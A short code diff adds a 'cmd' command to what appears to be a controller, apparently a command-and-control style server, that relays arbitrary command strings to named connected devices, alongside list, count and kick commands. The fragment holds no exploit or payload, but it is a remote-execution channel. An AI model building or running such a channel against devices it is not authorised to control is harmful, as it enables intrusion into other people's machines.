@@ -19,6 +19,14 @@ def clist(x):
 def ccount(x):
     return len(ds)
 
+@cc.command(["cmd"],
+    Arg(str, "target device"),
+    Arg(str, "command",optional=True, multi=True))
+def ccmd(x):
+    if ds.get(x[0], None) == None: return "Can not find device '%s'"%x[0]
+    return ds[x[0]].send(Packet("cmd", x[1]))
+
+
 @cc.command(["kick"],
     Arg(str, "target device"))
 def ckick(x):
